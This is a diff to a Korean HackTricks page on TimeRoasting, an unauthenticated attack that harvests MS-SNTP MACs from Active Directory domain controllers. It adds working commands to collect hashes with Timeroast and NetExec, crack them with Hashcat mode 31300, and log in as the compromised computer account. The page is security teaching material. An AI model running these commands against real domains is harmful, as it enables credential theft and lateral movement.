@@ -2,39 +2,58 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-timeRoasting의 주요 원인은 Microsoft가 NTP 서버에 대한 확장에서 남긴 구식 인증 메커니즘인 MS-SNTP입니다. 이 메커니즘에서 클라이언트는 임의의 컴퓨터 계정의 상대 식별자(RID)를 직접 사용할 수 있으며, 도메인 컨트롤러는 컴퓨터 계정의 NTLM 해시(MD4로 생성됨)를 키로 사용하여 응답 패킷의 **메시지 인증 코드(MAC)**를 생성합니다.
+TimeRoasting은 레거시 MS-SNTP 인증 확장을 악용합니다. MS-SNTP에서 클라이언트는 임의의 컴퓨터 계정 RID를 포함한 68바이트 요청을 보낼 수 있으며, 도메인 컨트롤러는 응답에 대한 MAC을 계산하기 위해 해당 컴퓨터 계정의 NTLM 해시(MD4)를 키로 사용하고 이를 반환합니다. 공격자는 인증 없이 이러한 MS-SNTP MAC을 수집해 오프라인으로 크랙(Hashcat mode 31300)하여 컴퓨터 계정 비밀번호를 복구할 수 있습니다.
 
-공격자는 이 메커니즘을 이용하여 인증 없이 임의의 컴퓨터 계정의 동등한 해시 값을 얻을 수 있습니다. 분명히, 우리는 Hashcat과 같은 도구를 사용하여 무차별 대입 공격을 수행할 수 있습니다.
-
-구체적인 메커니즘은 [MS-SNTP 프로토콜에 대한 공식 Windows 문서](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)의 섹션 3.1.5.1 "인증 요청 동작"에서 확인할 수 있습니다.
-
-문서에서 섹션 3.1.5.1은 인증 요청 동작을 다룹니다.
+자세한 내용은 공식 MS-SNTP 규격의 섹션 3.1.5.1 "Authentication Request Behavior" 및 4 "Protocol Examples"를 참조하세요.
 ![](../../images/Pasted%20image%2020250709114508.png)
-ExtendedAuthenticatorSupported ADM 요소가 `false`로 설정되면 원래의 Markdown 형식이 유지되는 것을 볼 수 있습니다.
+ExtendedAuthenticatorSupported ADM 요소가 false이면, 클라이언트는 68바이트 요청을 전송하고 authenticator의 Key Identifier 하위필드의 최하위 31비트에 RID를 기록합니다.
 
->원문 인용：
->>ExtendedAuthenticatorSupported ADM 요소가 false인 경우, 클라이언트는 클라이언트 NTP 요청 메시지를 구성해야 합니다. 클라이언트 NTP 요청 메시지의 길이는 68바이트입니다. 클라이언트는 섹션 2.2.1에 설명된 대로 클라이언트 NTP 요청 메시지의 인증자 필드를 설정하고, RID 값의 가장 낮은 31비트를 인증자의 키 식별자 하위 필드의 가장 낮은 31비트에 기록한 다음, 키 선택자 값을 키 식별자 하위 필드의 가장 높은 비트에 기록합니다.
+> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.
 
-문서 섹션 4 프로토콜 예제 3항
+섹션 4 (Protocol Examples)에서:
 
->원문 인용：
->>3. 요청을 수신한 후, 서버는 수신된 메시지 크기가 68바이트인지 확인합니다. 그렇지 않은 경우, 서버는 요청을 삭제하거나(메시지 크기가 48바이트가 아닌 경우) 인증되지 않은 요청으로 처리합니다(메시지 크기가 48바이트인 경우). 수신된 메시지 크기가 68바이트라고 가정하면, 서버는 수신된 메시지에서 RID를 추출합니다. 서버는 이를 사용하여 NetrLogonComputeServerDigest 메서드를 호출하여( [MS-NRPC] 섹션 3.5.4.8.2에 명시됨) 암호 체크섬을 계산하고, 수신된 메시지의 키 식별자 하위 필드에서 가장 높은 비트를 기준으로 암호 체크섬을 선택합니다(섹션 3.2.5에 명시됨). 그런 다음 서버는 클라이언트에게 응답을 보내며, 키 식별자 필드를 0으로 설정하고 암호 체크섬 필드를 계산된 암호 체크섬으로 설정합니다.
+> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.
 
-위 Microsoft 공식 문서의 설명에 따르면, 사용자는 인증이 필요하지 않으며, RID를 입력하여 요청을 시작하면 암호 체크섬을 얻을 수 있습니다. 암호 체크섬은 문서의 섹션 3.2.5.1.1에서 설명됩니다.
-
->원문 인용：
->>서버는 클라이언트 NTP 요청 메시지의 인증자 필드의 키 식별자 하위 필드의 가장 낮은 31비트에서 RID를 검색합니다. 서버는 NetrLogonComputeServerDigest 메서드를 사용하여( [MS-NRPC] 섹션 3.5.4.8.2에 명시됨) 다음 입력 매개변수로 암호 체크섬을 계산합니다:
->>>![](../../images/Pasted%20image%2020250709115757.png)
-
-암호 체크섬은 MD5를 사용하여 계산되며, 구체적인 과정은 문서의 내용에서 참조할 수 있습니다. 이는 우리가 로스팅 공격을 수행할 기회를 제공합니다.
+crypto-checksum은 MD5 기반(섹션 3.2.5.1.1 참조)이며 오프라인으로 크랙할 수 있어 roasting 공격을 가능하게 합니다.
 
 ## 공격 방법
 
-Quote to https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-roasting-timeroasting/
-
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort의 Timeroasting 스크립트
-```
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting 스크립트 by Tom Tervoort
+```bash
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
 ```
+---
+
+## NetExec + Hashcat를 이용한 실전 공격(인증 없음)
+
+- NetExec는 인증 없이 컴퓨터 RIDs에 대한 MS-SNTP MAC을 열거하고 수집하여 크래킹 준비된 $sntp-ms$ 해시를 출력할 수 있습니다:
+```bash
+# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
+netexec smb <dc_fqdn_or_ip> -M timeroast
+# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
+```
+- 오프라인에서 Crack을 Hashcat mode 31300 (MS-SNTP MAC)으로 수행:
+```bash
+hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
+# or let recent hashcat auto-detect; keep RIDs with --username for convenience
+```
+- 복구된 평문은 컴퓨터 계정 암호에 해당합니다. NTLM이 비활성화된 경우 Kerberos (-k)를 사용하여 컴퓨터 계정으로 직접 시도하세요:
+```bash
+# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
+netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
+```
+운영 팁
+- Kerberos 전에 정확한 시간 동기화가 되어 있는지 확인하세요: `sudo ntpdate <dc_fqdn>`
+- 필요한 경우 AD realm용 krb5.conf를 생성하세요: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
+- 인증된 foothold를 확보한 후 LDAP/BloodHound를 통해 RIDs를 principals에 매핑하세요.
+
+## References
+
+- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
+- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
+- [NetExec – official docs](https://www.netexec.wiki/)
+- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
 {{#include ../../banners/hacktricks-training.md}}
